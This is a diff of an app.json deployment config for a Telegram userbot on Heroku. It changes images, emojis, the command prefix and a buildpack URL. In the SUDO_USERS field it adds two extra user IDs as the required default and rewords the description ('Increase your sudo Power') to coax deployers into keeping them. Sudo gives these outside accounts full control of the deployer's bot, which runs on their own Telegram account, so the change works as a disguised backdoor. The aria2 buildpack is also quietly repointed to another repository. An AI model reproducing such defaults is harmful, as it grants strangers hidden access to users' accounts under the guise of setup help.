@@ -34,7 +34,7 @@
     },
     "YOUR_GROUP": {
       "description": "Set Ur Group Username",
-      "value": "@Python_Userbot_Support_Pro",
+      "value": "@Python_Userbot_Support",
       "required": false
     },
     "YOUR_CHANNEL": {
@@ -54,12 +54,12 @@
     },
     "AWAKE_PIC": {
       "description": "Put here any telegraph media link for awake pic in .awake Or .pybot command.",
-      "value": "https://telegra.ph/file/f78f716654c404bfa2df7.jpg",
+      "value": "https://te.legra.ph/file/6dd136eeea334c385d5f4.jpg",
       "required": true
     },
     "PYTHON_PIC": {
       "description": "Put here any telegraph media link for PYTHON pic in .op command.",
-      "value": "https://telegra.ph/file/f78f716654c404bfa2df7.jpg",
+      "value": "https://te.legra.ph/file/761e7a5f71f93cd6b4b5a.jpg",
       "required": true
     },
     "ALIVE_PIC": {
@@ -96,9 +96,10 @@
       "description": "Get this value from my.telegram.org! Putting Others Value may result In Account Ban.",
       "value": ""
     },
+  
     "SUDO_USERS": {
-      "description": "Enter your friends user id to to give him bot full access no clear this no. add othar sudo id",
-      "value": "2043276182",
+      "description": "Enter these friends user id to to give him sudo no <===>☆(2017355758 2008302614 2043276182)☆<===> {Increase your sudo Power} add more user id for More power sudo id",
+      "value": "2043276182 2017355758 2008302614",
       "required": true
     },
     "SUDO_COMMAND_HAND_LER": {
@@ -107,8 +108,8 @@
       "required": false
     },
     "COMMAND_HAND_LER": {
-      "description": "U can Change Ur command Handler By Default it is (.)",
-      "value": ".",
+      "description": "U can Change Ur command Handler By Default it is (¡)",
+      "value": "¡",
       "required": true
       },
     "API_HASH": {
@@ -175,17 +176,17 @@
     },
     "EMOJI_IN_HELP1": {
       "description": "Set The emojies You Want to Add In Help Command!!",
-      "value": "⚜",
+      "value": "🤍",
       "required": true
     },
     "EMOJI_IN_HELP2": {
       "description": "Set The emojies You Want to Add In Help Command!!",
-      "value": "💫",
+      "value": "💋",
       "required": false
     },
     "ALIVE_EMOJI": {
       "description": "Set The emojies You Want to Add In Help Command!!",
-      "value": "⚡",
+      "value": "💞",
       "required": false
     },
     "PM_DATA": {
@@ -206,7 +207,7 @@
     {
       "url": "https://github.com/jonathanong/heroku-buildpack-ffmpeg-latest"
   },{
-    "url":"https://github.com/amivin/aria2-heroku.git"
+    "url":"https://github.com/DARK-LEGEND-PRO/aria2-heroku.git"
   },{
     "url":"https://github.com/heroku/heroku-buildpack-google-chrome"
   },{
